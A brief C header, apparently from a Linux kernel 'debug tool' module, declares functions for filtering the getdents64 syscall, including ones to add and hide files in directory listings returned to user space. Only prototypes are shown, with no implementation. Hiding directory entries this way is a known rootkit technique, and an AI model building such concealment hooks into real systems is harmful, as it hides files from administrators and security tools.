
#ifndef DEBUG_TOOL_CMD_GETDENTS64_H
#define DEBUG_TOOL_CMD_GETDENTS64_H
void init_getdents64_filter_list();
void clean_getdents64_filter_list();

void operate_getdents64_cmd(unsigned long arg);

int getdents64_get_flag(const char *dir);
long getdents64_add_file(char *dir, char __user * user_buffer, long value, unsigned int count);
long getdents64_hide_file(char *dir, char __user * user_buffer, long value, unsigned int count);

#define GETDENTS64_MAX_USER_FILE_PATH 128

#endif

